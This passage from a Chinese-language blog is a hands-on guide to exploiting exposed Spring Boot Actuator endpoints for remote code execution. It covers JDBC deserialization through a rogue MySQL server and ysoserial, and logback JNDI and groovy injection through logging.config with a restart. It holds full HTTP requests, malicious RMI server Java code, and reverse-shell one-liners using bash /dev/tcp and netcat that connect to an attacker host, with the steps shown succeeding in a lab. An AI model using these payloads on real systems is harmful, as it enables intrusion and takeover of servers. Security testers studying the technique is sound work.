 关键词，并记录下其版本号（5.x 或 8.x）；</p><p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p><p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code>  值，方便后续恢复其正常 jdbc url 值。</p><p><strong>步骤二：架设恶意 rogue mysql server</strong></p><p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p><p>这里使用反序列工具ysoserial(包含所有攻击方式，在环境包中的target目录下)ysoserial可以设置的命令参数如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$  java -jar ysoserial.jar</span><br><span class="line">Y SO SERIAL?</span><br><span class="line">Usage: java -jar ysoserial.jar [payload] &#x27;[command]&#x27;</span><br><span class="line">  Available payload types:</span><br><span class="line">     Payload             Authors                     Dependencies</span><br><span class="line">     -------             -------                     ------------</span><br><span class="line">     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2</span><br><span class="line">     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5</span><br><span class="line">     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11</span><br><span class="line">     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0</span><br><span class="line">     Clojure             @JackOfMostTrades           clojure:1.8.0</span><br><span class="line">     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</span><br><span class="line">     CommonsCollections1 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections2 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections3 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections4 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1</span><br><span class="line">     CommonsCollections6 @matthias_kaiser            commons-collections:3.1</span><br><span class="line">     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br><span class="line">     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4</span><br><span class="line">     Groovy1             @frohoff                    groovy:2.3.9</span><br><span class="line">     Hibernate1          @mbechler</span><br><span class="line">     Hibernate2          @mbechler</span><br><span class="line">     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     JRMPClient          @mbechler</span><br><span class="line">     JRMPListener        @mbechler</span><br><span class="line">     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1</span><br><span class="line">     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     Jdk7u21             @frohoff</span><br><span class="line">     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2</span><br><span class="line">     MozillaRhino1       @matthias_kaiser            js:1.7R2</span><br><span class="line">     MozillaRhino2       @_tint0                     js:1.7R2</span><br><span class="line">     Myfaces1            @mbechler</span><br><span class="line">     Myfaces2            @mbechler</span><br><span class="line">     ROME                @mbechler                   rome:1.0</span><br><span class="line">     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE</span><br><span class="line">     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2</span><br><span class="line">     URLDNS              @gebl</span><br><span class="line">     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14</span><br><span class="line">     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar (payload)  &gt; payload.ser</span><br></pre></td></tr></table></figure><p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p><p><strong>步骤三：设置 spring.datasource.url 属性</strong></p><blockquote><p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p></blockquote><p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure><p> mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤四：刷新配置</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>步骤五：触发数据库查询</strong></p><p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p><p><strong>步骤六：恢复正常 jdbc url</strong></p><p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p><h5 id="利用实例-8"><a href="#利用实例-8" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点 <a href="http://192.168.233.242:9097/actuator/evn">http://192.168.233.242:9097/actuator/evn</a>   查看环境变量设置和依赖</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210901112521481.png" alt="image-20210901112521481"></p><p>然后架设恶意 rogue mysql server，使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令，讲生成的文件放置在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 ‘bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1’ &gt; payload.ser</span><br></pre></td></tr></table></figure><p>然后运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本开启3306端口</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210901141559697.png" alt="image-20210901141559697"></p><p>POST方式构造请求/actuator/env，设置spring.datasource.url为上面开启服务的ip地址</p><p>请求报文如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9097</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 216</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;jdbc:mysql://192.168.233.242:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210901142357376.png" alt="image-20210901142357376"></p><p>访问/actuator/refresh刷新配置</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210901142612261.png" alt="image-20210901142612261"></p><p>在接着访问数据库查询的接口，在调用数据库服务的时候就会请求上面设置的url</p><p>例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p><p>可以看到前面开启的mysql服务中会显示连接的客户端和返回的一些内容</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210901142838024.png" alt="image-20210901142838024"></p><p>shell反弹成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210901145716430.png" alt="image-20210901145716430"></p><h5 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h5><ul><li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li><li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li><li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li><li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li><li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li></ul><p>详细漏洞分析参见下文</p><p>​    <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p><p>  <a href="http://cn-sec.com/archives/116934.html">  MySQL-JDBC 反序列化 | CN-SEC 中文网</a></p><h4 id="2-10-restart-logging-config-logback-JNDI-RCE"><a href="#2-10-restart-logging-config-logback-JNDI-RCE" class="headerlink" title="2.10.  restart logging.config logback JNDI RCE"></a>2.10.  restart logging.config logback JNDI RCE</h4><h5 id="利用条件-12"><a href="#利用条件-12" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li><li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li></ul><h5 id="利用方法-11"><a href="#利用方法-11" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 xml 文件</strong></p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的  <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://your-vps-ip:1389/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>步骤二：托管RMI服务及代码</strong></p><p>编写优化过后的用来反弹 shell 的JAVA代码(只需修改代码中的服务监听端口和反弹shell的ip地址及其端口)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上面反弹shell的JAVA代码进行打包成jar包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure><p><strong>步骤三:  启动RMI服务</strong></p><p>指定开启连接RMI服务的主机IP地址，架设RMI服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure><p><strong>步骤三：设置 logging.config 属性</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.xml</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.xml&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤四：重启应用</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="利用实例-9"><a href="#利用实例-9" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写example.xml文档，访问192.168.233.242的RMI服务，放置在开启WEB服务的根目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.242:8090/jndi&quot; as=&quot;appName&quot;/&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>然后使用python开启个简单的http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  SimpleHTTPServer  -m 80</span><br></pre></td></tr></table></figure><p>编写恶意RMI服务的反弹shell的JAVA代码,当用户访问该RMI服务时会导致使用nc连接到攻击者的主机，实现反向shell连接</p><p>代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将该代码进行maven打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure><p>![image-20210830204556955](C:\Users\ZR\Desktop\springboot\Spring Boot Actuator未授权访问利用实战利用.assets\image-20210830204556955.png)</p><p>然后指定访问ip地址开启RMI服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure><p>![image-20210830204855751](C:\Users\ZR\Desktop\springboot\Spring Boot Actuator未授权访问利用实战利用.assets\image-20210830204855751.png)</p><p>使用nc监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>POST方式构造请求包对/actuator/env发出请求，设置logging.config为前面example.xml的请求地址</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210831165413164.png" alt="image-20210831165413164"></p><p>然后再访问/actuator/restart端点重新启动项目加载变量</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210831165556609.png" alt="image-20210831165556609"></p><p>此时就会看到连接shell成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210831165644535.png" alt="image-20210831165644535"></p><h5 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h5><ul><li>目标机器通过 logging.config 属性设置 logback日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ul><h4 id="2-11-restart-logging-config-groovy-RCE"><a href="#2-11-restart-logging-config-groovy-RCE" class="headerlink" title="2.11. restart logging.config groovy RCE"></a>2.11. restart logging.config groovy RCE</h4><h5 id="利用条件-13"><a href="#利用条件-13" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><h5 id="利用方法-12"><a href="#利用方法-12" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 groovy 文件</strong></p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;执行代码&quot;)</span><br></pre></td></tr></table></figure><p><strong>步骤二：设置 spring.main.sources 属性</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤三：重启应用</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="利用实例-10"><a href="#利用实例-10" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写groovy文件并将其放在http服务根目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure><p>使用python开启http服务</p><figure class="highlight plaintext"><table><tr><td 